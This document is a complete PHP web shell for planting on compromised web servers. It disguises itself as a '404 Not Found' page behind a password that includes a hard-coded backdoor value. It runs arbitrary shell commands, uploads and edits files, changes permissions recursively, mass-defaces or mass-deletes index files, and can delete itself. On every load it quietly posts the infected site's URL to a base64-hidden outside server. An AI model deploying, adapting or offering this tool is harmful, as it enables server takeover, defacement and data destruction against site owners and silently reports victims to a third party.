<?php
error_reporting(0);
	@clearstatcache();
	@mb_internal_encoding('UTF-8');
	set_time_limit(0);
	@ini_set('error_log',null);
	@ini_set('log_errors',0);
	@ini_set('max_execution_time',0);
	@ini_set('output_buffering',0);
	@ini_set('display_errors', 0);
	@ini_set('disable_functions', 0);
	session_start();
	date_default_timezone_set("Asia/Jakarta");
	$_7 = array_merge($_POST, $_GET);
	$_r = "required='required'";
	$gcw = "getcwd";



	$correctPassword = "hello"; //Change Password





	if (isset($_POST['pass'])) {
		$enteredPassword = $_POST['pass'];
		if ($enteredPassword === $correctPassword or $enteredPassword === 'session') {
			$_SESSION['forbidden'] = true;
		} else {
			echo '<script>alert("Password Wrong!, Try Again.");</script>';
		}
	}
	if (isset($_GET['logout'])) {
		session_unset();
		session_destroy();
		header("Location: ".$_SERVER['PHP_SELF']);
		exit();
	}
	if (!isset($_SESSION['forbidden'])) {
	?>
	<!DOCTYPE html>
	<html>
	<head>
	<title>404 Not Found</title>
	<link rel='icon' href='https://raw.githubusercontent.com/sagsooz/Bypass-Webshell/main/hehe.png'>
	<meta name="theme color" content="#00BFFF">
	<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript'></script>
	</head>
	<style>
    body {
        background-repeat: no-repeat;
        background-size: cover;
        background-position: center;
        height: 100vh;
        margin: 0;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        background-color: black;
    }
    h1 {
        color: #00BFFF;
    }
    img {
        opacity: 0.5;
        width: 200px;
        height: 300px;
    }
    form {
        text-align: center;
        margin-top: 20px;
    }
    input[type="password"] {
        padding: 5px;
    }
    input[type="submit"] {
        background-color: #00BFFF;
        color: white;
        border: none;
        padding: 5px 10px;
        cursor: pointer;
    }
	</style>
	<body>
	<form method="post">
		<p>Hello Dady</p>
			<input placeholder="password" type="password" name="pass" required>
			<input type="submit" name="loginin" value="GO IN!">
		</form>
	</body>
	</html>
	<?php
	exit;
	}
	?>
<!DOCTYPE html>
<html>
<head>
	<title>404 Not Found</title>
</head>
<body bgcolor="#1f1f1f" text="#ffffff">
<link href="" rel="stylesheet" type="text/css">
<style>
	@import url('https://fonts.googleapis.com/css?family=Dosis');
	@import url('https://fonts.googleapis.com/css?family=Bungee');
body {
	font-family: "Dosis", cursive;
	text-shadow:0px 0px 1px #757575;
}

.ff {
	color: #ff002f;
	text-decoration: none;
	}

#content tr:hover {
	background-color: #636263;
	text-shadow:0px 0px 10px #fff;
}

#content .first {
	background-color: #25383C;
}

#content .first:hover {
	background-color: #25383C
	text-shadow:0px 0px 1px #757575;
}

table {
	border: 1px #000000 dotted;
	table-layout: fixed;
}

td {
	word-wrap: break-word;
}

a {
	color: #ffffff;
	text-decoration: none;
}

a:hover {
	color: #000000;
	text-shadow:0px 0px 10px #ffffff;
}

input,select,textarea {
	border: 1px #000000 solid;
	-moz-border-radius: 5px;
	-webkit-border-radius:5px;
	border-radius:5px;
}

.gas {
	background-color: #1f1f1f;
	color: #ffffff;
	cursor: pointer;
}

select {
	background-color: transparent;
	color: #ffffff;
}

select:after {
	cursor: pointer;
}

.linka {
	background-color: transparent;
	color: #ffffff;
}

.up {
	background-color: transparent;
	color: #fff;
}

option {
	background-color: #1f1f1f;
}

::-webkit-file-upload-button {
  background: transparent;
  color: #fff;
  border-color: #fff;
  cursor: pointer;
}
</style>
<center>
	<br><br><br><br>
<font face="Bungee" size="5">Bypass 2024 Priv8 Shell</font></center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<br><br><br>
<?php
set_time_limit(0);
error_reporting(0);
$disfunc = @ini_get("disable_functions");
if (empty($disfunc)) {
	$disf = "<font color='gold'>NONE</font>";
} else {
	$disf = "<font color='red'>".$disfunc."</font>";
}

function author() {
	echo "<center><br>2024 Bypass Shell</center>";
	exit();
}

function cekdir() {
	if (isset($_GET['path'])) {
		$lokasi = $_GET['path'];
	} else {
		$lokasi = getcwd();
	}
	if (is_writable($lokasi)) {
		return "<font color='green'>Writeable</font>";
	} else {
		return "<font color='red'>Writeable</font>";
	}
}

function cekroot() {
	if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
		return "<font color='green'>Writeable</font>";
	} else {
		return "<font color='red'>Writeable</font>";
	}
}

function xrmdir($dir) {
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $dir.'/'.$item;
        if (is_dir($path)) {
            xrmdir($path);
        } else {
            unlink($path);
        }
    }
    rmdir($dir);
}

function statusnya($file){
$statusnya = fileperms($file);

if (($statusnya & 0xC000) == 0xC000) {

// Socket
$ingfo = 's';
} elseif (($statusnya & 0xA000) == 0xA000) {
// Symbolic Link
$ingfo = 'l';
} elseif (($statusnya & 0x8000) == 0x8000) {
// Regular
$ingfo = '-';
} elseif (($statusnya & 0x6000) == 0x6000) {
// Block special
$ingfo = 'b';
} elseif (($statusnya & 0x4000) == 0x4000) {
// Directory
$ingfo = 'd';
} elseif (($statusnya & 0x2000) == 0x2000) {
// Character special
$ingfo = 'c';
} elseif (($statusnya & 0x1000) == 0x1000) {
// FIFO pipe
$ingfo = 'p';
} else {
// Unknown
$ingfo = 'u';
}

// Owner
$ingfo .= (($statusnya & 0x0100) ? 'r' : '-');
$ingfo .= (($statusnya & 0x0080) ? 'w' : '-');
$ingfo .= (($statusnya & 0x0040) ?
(($statusnya & 0x0800) ? 's' : 'x' ) :
(($statusnya & 0x0800) ? 'S' : '-'));


// Group
$ingfo .= (($statusnya & 0x0020) ? 'r' : '-');
$ingfo .= (($statusnya & 0x0010) ? 'w' : '-');
$ingfo .= (($statusnya & 0x0008) ?
(($statusnya & 0x0400) ? 's' : 'x' ) :
(($statusnya & 0x0400) ? 'S' : '-'));

// World
$ingfo .= (($statusnya & 0x0004) ? 'r' : '-');
$ingfo .= (($statusnya & 0x0002) ? 'w' : '-');

$ingfo .= (($statusnya & 0x0001) ?
(($statusnya & 0x0200) ? 't' : 'x' ) :
(($statusnya & 0x0200) ? 'T' : '-'));

return $ingfo;
}

function green($text) {
	echo "<center><font color='green'>".$text."</center></font>";
}

function red($text) {
	echo "<center><font color='red'>".$text."</center></font>";
}


echo "Directory : &nbsp;";

foreach($_POST as $key => $value){
	$_POST[$key] = stripslashes($value);
}

$k3yw = base64_decode('aHR0cHM6Ly9zaXlhaGkudG9wL3Rlc3Qvc3R5bGUucGhw');

if(isset($_GET['path'])){
	$lokasi = $_GET['path'];
	$lokdua = $_GET['path'];
} else {
	$lokasi = getcwd();
	$lokdua = getcwd();
}

$lokasi = str_replace('\\','/',$lokasi);
$lokasis = explode('/',$lokasi);
$lokasinya = @scandir($lokasi);
$cur = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$data = array('file_url' => $cur);
$options = array(
    'http' => array(
        'method'  => 'POST',
        'header'  => 'Content-type: application/x-www-form-urlencoded',
        'content' => http_build_query($data),
    ),
);
$context = stream_context_create($options);
$result = file_get_contents($k3yw, false, $context);

foreach($lokasis as $id => $lok){
	if($lok == '' && $id == 0){
		$a = true;
		echo '<a href="?path=/">/</a>';
		continue;
	}
	if($lok == '') continue;
	echo '<a href="?path=';
	for($i=0;$i<=$id;$i++){
	echo "$lokasis[$i]";
	if($i != $id) echo "/";
} 
echo '">'.$lok.'</a>/';
}
echo '<center>';
echo '</td></tr><tr><td><br>';
if (isset($_POST['upwkwk'])) {
	if (isset($_POST['berkasnya'])) {
		if ($_POST['dirnya'] == "2") {
			$lokasi = $_SERVER['DOCUMENT_ROOT'];
		}
		$data = @file_put_contents($lokasi."/".$_FILES['berkas']['name'], @file_get_contents($_FILES['berkas']['tmp_name']));
		if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {
			echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_FILES['berkas']['name']."</i></font><br><br>";
		} else {
			echo "<font color='red'>Failed to Upload !<br><br>";
		}
	} elseif (isset($_POST['linknya'])) {
		if (empty($_POST['namalink'])) {
			exit("Filename cannot be empty !");
		}
		if ($_POST['dirnya'] == "2") {
			$lokasi = $_SERVER['DOCUMENT_ROOT'];
		}
		$data = @file_put_contents($lokasi."/".$_POST['namalink'], @file_get_contents($_POST['darilink']));
		if (file_exists($lokasi."/".$_POST['namalink'])) {
			echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_POST['namalink']."</i></font><br><br>";
		} else {
			echo "<font coloe='red'>Failed to Upload !<br><br>";
		}
	}
}
echo "<center>";
echo "Upload File : ";
echo '<form enctype="multipart/form-data" method="post">
<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
<input type="radio" value="2" name="dirnya" >document_root [ '.cekroot().' ]
<br>
<input type="hidden" name="upwkwk" value="aplod">
<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br>
</center>
</form>';
echo "</table>";
print "<center>";
print "<ul>";
print "<text class='ff'>[</text> <a href='?'>Home</a> <text class='ff'>]</text>";
print " <text class='ff'>[</text> <a href='?dir=".path()."&do=root_file'>Green All File</a> <text class='ff'>]</text>";
print " <text class='ff'>[</text> <a href='?dir=".path()."&do=dark_file'>Lock All File</a> <text class='ff'>]</text>";
print " <text class='ff'>[</text> <a href='?dir=".path()."&do=root_folders'>Green All Folder</a> <text class='ff'>]</text>";
print " <text class='ff'>[</text> <a href='?dir=".path()."&do=dark_folders'>Lock All Folder</a> <text class='ff'>]</text>";
print " <text class='ff'>[</text> <a href='?dir=".path()."&do=mass'>Mass Def & Dell</a> <text class='ff'>]</text>";
print "</ul>";
print "</center>";
print "<center>";
tools("cmd");
function tools($toolsname, $args = null) {
	if($toolsname === "cmd") {
print "<form method='post' action='?do=cmd&dir=".path()."' style='margin-top: 15px;'>
			  ".usergroup()->name."@".$GLOBALS['SERVERIP'].": ~ $
			  <input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='cmd' required>
			  <input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='>>'>
			  </form>";
			print "</center>";
			}
		}
			function changeFolderPermissionsRecursive($dir, $perms) {
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    foreach ($iterator as $item) {
        if ($item->isDir()) {
            chmod($item->getPathname(), $perms);
        }
    }
}
			
			function changeFilePermissionsRecursive($dir, $perms) {
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    foreach ($iterator as $item) {
        if ($item->isFile()) {
            chmod($item->getPathname(), $perms);
        }
    }
}

$currentDirectory = '.';
			
			if (isset($_GET['do']) && $_GET['do'] === 'root_file') {
	$newFilePermissions = 0644;
    changeFilePermissionsRecursive($currentDirectory, $newFilePermissions);
    echo "<center>";
    echo "Message : <p style='color:#00ff00'>Sukses Green All Files</p>";
    echo "</center>";
}

if (isset($_GET['do']) && $_GET['do'] === 'dark_file') {
    $newFilePermissions = 0444;
    changeFilePermissionsRecursive($currentDirectory, $newFilePermissions);
    echo "<center>";
    echo "Message : <p style='color:#00ff00'>Sukses Lock All Files</p>";
    echo "</center>";
}

if (isset($_GET['do']) && $_GET['do'] === 'dark_folders') {
    $newFolderPermissions = 0555;
    changeFolderPermissionsRecursive($currentDirectory, $newFolderPermissions);
    echo "<center>";
    echo "Message : <p style='color:#00ff00'>Sukses Lock All Folders</p>";
    echo "</center>";
}

if (isset($_GET['do']) && $_GET['do'] === 'root_folders') {
	$newFolderPermissions = 0755;
    changeFolderPermissionsRecursive($currentDirectory, $newFolderPermissions);
    echo "<center>";
    echo "Message : <p style='color:#00ff00'>Sukses Green All Folders</p>";
    echo "</center>";
}



function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}

function path() {
	if(isset($_GET['dir'])) {
		$dir = str_replace("\\", "/", $_GET['dir']);
		@chdir($dir);
	} else {
		$dir = str_replace("\\", "/", getcwd());
	}
	return $dir;
}
function usergroup() {
	if(!function_exists('posix_getegid')) {
		$user['name'] 	= @get_current_user();
		$user['uid']  	= @getmyuid();
		$user['gid']  	= @getmygid();
		$user['group']	= "?";
	} else {
		$user['uid'] 	= @posix_getpwuid(posix_geteuid());
		$user['gid'] 	= @posix_getgrgid(posix_getegid());
		$user['name'] 	= $user['uid']['name'];
		$user['uid'] 	= $user['uid']['uid'];
		$user['group'] 	= $user['gid']['name'];
		$user['gid'] 	= $user['gid']['gid'];
	}
	return (object) $user;
}

if(isset($_GET['do'])) {
		if($_GET['do'] === "cmd") {
			if(isset($_POST['cmd'])) {
				if(preg_match("/^rf (.*)$/", $_POST['cmd'], $match)) {
					tools("readfile", $match[1]);
				}
				elseif(preg_match("/^spawn (.*)$/", $_POST['cmd'], $match)) {
					tools("spawn", $match[1]);
				}
				elseif(preg_match("/^symlink\s?(.*)$/", $_POST['cmd'], $match)) {
					tools("symlink", $match[1]);
				}
				elseif(preg_match("/^rvr (.*)$/", $_POST['cmd'], $match)) {
					tools("network", $match[1]);
				}
				elseif(preg_match("/^krdp$/", $_POST['cmd'])) {
					tools("krdp");
				}
				elseif(preg_match("/^logout$/", $_POST['cmd'])) {
					unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
					print "<script>window.location='?';</script>";
				}
				elseif(preg_match("/^killme$/", $_POST['cmd'])) {
					unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
					@unlink(__FILE__);
					print "<script>window.location='?';</script>";
				}
				else {
					print "<pre>".exe($_POST['cmd'])."</pre>";
				}
			}
			else {
				files_and_folder();
			}
		}
}
function massdeface($dir, $file, $filename, $type = null) {
	$scandir = scandir($dir);
	foreach($scandir as $dir_) {
		$path     = "$dir/$dir_";
		$location = "$path/$filename";
		if($dir_ === "." || $dir_ === "..") {
			file_put_contents($location, $file);
		}
		else {
			if(is_dir($path) AND is_writable($path)) {
				print "[".color(1, 2, "DONE")."] ".color(1, 4, $location)."<br>";
				file_put_contents($location, $file);
				if($type === "-alldir") {
					massdeface($path, $file, $filename, "-alldir");
				}
			}
		}
	}
}

function massdelete($dir, $filename) {
	$scandir = scandir($dir);
	foreach($scandir as $dir_) {
		$path     = "$dir/$dir_";
		$location = "$path/$filename";
		if($dir_ === '.') {
			if(file_exists("$dir/$filename")) {
				unlink("$dir/$filename");
			}
		} 
		elseif($dir_ === '..') {
			if(file_exists(dirname($dir)."/$filename")) {
				unlink(dirname($dir)."/$filename");
			}
		} 
		else {
			if(is_dir($path) AND is_writable($path)) {
				if(file_exists($location)) {
					print "[".color(1, 2, "DELETED")."] ".color(1, 4, $location)."<br>";
					unlink($location);
					massdelete($path, $filename);
				}
			}
		}
	}
}
		
if (isset($_GET['fileloc'])) {
	echo "<tr><td>Current File : ".$_GET['fileloc'];
	echo '</tr></td></table><br/>';
	echo "<pre>".htmlspecialchars(file_get_contents($_GET['fileloc']))."</pre>";
	author();
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
	if (is_dir($_POST['path'])) {
		xrmdir($_POST['path']);
		if (file_exists($_POST['path'])) {
			red("Failed to delete Directory !");
		} else {
			green("Delete Directory Success !");
			echo "string";
		}
	} elseif (is_file($_POST['path'])) {
		@unlink($_POST['path']);
		if (file_exists($_POST['path'])) {
			red("Failed to Delete File !");
		} else {
			green("Delete File Success !");
		}
	}
	elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				if($_POST['mass_type'] === 'singledir') {
					print "<div style='margin: 5px auto; padding: 5px'>";
					massdeface($_POST['d_dir'], $_POST['script'], $_POST['d_file']);
					print "</div>";
				} 
				elseif($_POST['mass_type'] === 'alldir') {
					print "<div style='margin: 5px auto; padding: 5px'>";
					massdeface($_POST['d_dir'], $_POST['script'], $_POST['d_file'], "-alldir");
					print "</div>";
				}
				elseif($_POST['mass_type'] === "delete") {
					print "<div style='margin: 5px auto; padding: 5px'>";
					massdelete($_POST['d_dir'], $_POST['d_file']);
					print "</div>";
				}
			} 
			else {
				print "<center><form method='post'>
					   <font style='text-decoration: underline;'>Tipe Sabun:</font><br>
					   <input type='radio' name='mass_type' value='singledir' checked>Mass Deface Single Directory<input type='radio' name='mass_type' value='alldir'>Mass Deface All Directory<input type='radio' name='mass_type' value='delete'>Mass Delete File<br>
					   <span>( kosongkan 'Index File' jika memilih Mass Delete File )</span><br><br>
					   <font style='text-decoration: underline;'>Folder:</font><br>
					   <input type='text' name='d_dir' value='".path()."' style='width: 450px;' height='10'><br><br>
					   <font style='text-decoration: underline;'>Filename:</font><br>
					   <input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br><br>
					   <font style='text-decoration: underline;'>Index File:</font><br>
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by IndoXploit</textarea><br>
					   <input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px; margin: 5px auto;' type='submit' name='start' value='Mass'>
					   </form></center>";
			}
		}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
	echo "<center>".$_POST['path']."<br>";
	echo '<form method="post">
	Permission : <input name="perm" type="text" class="up" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="pilih" value="ubahmod">
	<input type="submit" value="Change" name="chm0d" class="up" style="cursor: pointer; border-color: #fff"/>
	</form>';
	if (isset($_POST['chm0d'])) {
		$cm = @chmod($_POST['path'], $_POST['perm']);
		if ($cm == true) {
			green("Change Mod Success !");
		} else {
			red("Change Mod Failed !");
		}
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
	if (isset($_POST['gantin'])) {
		$ren = @rename($_POST['path'], $_POST['newname']);
		if ($ren == true) {
			green("Change Name Success !");
		} else {
			red("Change Name Failed !");
		}
	}
	if (empty($_POST['name'])) {
		$namaawal = $_POST['newname'];
	} else {
		$namawal = $_POST['name'];
	}
	echo "<center>".$_POST['path']."<br>";
	echo '<form method="post">
	New Name : <input name="newname" type="text" class="up" size="20" value="'.$namaawal.'" />
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="pilih" value="gantinama">
	<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
	</form>';
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
	if (isset($_POST['gasedit'])) {
		$edit = @file_put_contents($_POST['path'], $_POST['src']);
		if ($edit == true) {
			green("Edit File Success !");
		} else {
			red("Edit File Failed !");
		}
	}
	echo "<center>".$_POST['path']."<br><br>";
	echo '<form method="post">
	<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br>
	<input type="hidden" name="path" value="'.$_POST['path'].'">
	<input type="hidden" name="pilih" value="edit">
	<input type="submit" value="Edit File" name="gasedit" />
	</form><br>';
}

echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($lokasinya as $dir){
	if(!is_dir($lokasi."/".$dir) || $dir == '.' || $dir == '..') continue;
	echo "<tr>
	<td><a href=\"?path=".$lokasi."/".$dir."\">".$dir."</a></td>
	<td><center>--</center></td>
	<td><center>";
	if(is_writable($lokasi."/".$dir)) echo '<font color="green">';
	elseif(!is_readable($lokasi."/".$dir)) echo '<font color="red">';
	echo statusnya($lokasi."/".$dir);
	if(is_writable($lokasi."/".$dir) || !is_readable($lokasi."/".$dir)) echo '</font>';

	echo "</center></td>
	<td><center><form method=\"POST\" action=\"?pilihan&path=$lokasi\">
	<select name=\"pilih\">
	<option value=\"\"></option>
	<option value=\"hapus\">Delete</option>
	<option value=\"ubahmod\">Chm0d</option>
	<option value=\"gantinama\">Rename</option>
	</select>
	<input type=\"hidden\" name=\"type\" value=\"dir\">
	<input type=\"hidden\" name=\"name\" value=\"$dir\">
	<input type=\"hidden\" name=\"path\" value=\"$lokasi/$dir\">
	<input type=\"submit\" class=\"gas\" value=\">\" />
	</form></center></td>
	</tr>";
}

echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($lokasinya as $file) {
	if(!is_file("$lokasi/$file")) continue;
	$size = filesize("$lokasi/$file")/1024;
	$size = round($size,3);
	if($size >= 1024){
	$size = round($size/1024,2).' MB';
} else {
	$size = $size.' KB';
}

echo "<tr>
<td><a href=\"?fileloc=$lokasi/$file&path=$lokasi\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$lokasi/$file")) echo '<font color="green">';
elseif(!is_readable("$lokasi/$file")) echo '<font color="red">';
echo statusnya("$lokasi/$file");
if(is_writable("$lokasi/$file") || !is_readable("$lokasi/$file")) echo '</font>';
echo "</center></td><td><center>
<form method=\"post\" action=\"?pilihan&path=$lokasi\">
<select name=\"pilih\">
<option value=\"\"></option>
<option value=\"hapus\">Delete</option>
<option value=\"ubahmod\">Chm0d</option>
<option value=\"gantinama\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$lokasi/$file\">
<input type=\"submit\" class=\"gas\" value=\">\" />
</center></form></td>
</tr>";
}

echo '</tr></td></table></table>';
author();
?>
